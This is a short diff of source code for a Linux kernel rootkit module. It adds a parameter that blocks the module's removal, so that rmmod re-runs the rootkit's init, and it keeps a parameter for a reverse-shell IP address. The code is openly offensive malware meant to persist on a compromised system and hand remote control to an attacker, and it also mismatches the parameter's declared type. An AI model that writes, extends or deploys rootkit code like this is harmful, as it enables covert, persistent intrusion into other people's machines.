@@ -57,9 +57,9 @@ struct commands cmds;
  * intermittently and do things when it changes.
  **/
 
-static char *module_name = NULL;
-module_param(module_name, charp, 0770);
-MODULE_PARM_DESC(module_name, "Name of rootkit module.");
+static bool *block_removal = false;
+module_param(block_removal, charp, 0770);
+MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
 static char *rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
@@ -247,8 +247,15 @@ static int __init rootkit_init(void) {
  * Called when $ rmmod is executed. This function stops the rootkit from being removed.
  */
 static void __exit rootkit_exit(void) {
-    printk(KERN_INFO "Cleaning up rootkit.\nJust kidding. This sounds like a good time to reinstall your OS.");
-    rootkit_init();
+	printk(KERN_INFO "rmmod called. Cleaning up rootkit.");
+	if (block_removal) {
+		printk(KERN_INFO "Just kidding. This sounds like a good time to reinstall your OS.");
+		rootkit_init();
+	} else {
+		khook_cleanup();
+		timer_cleanup_wrapper(&polling_timer);
+	}
+
 }
 
 module_init(rootkit_init);
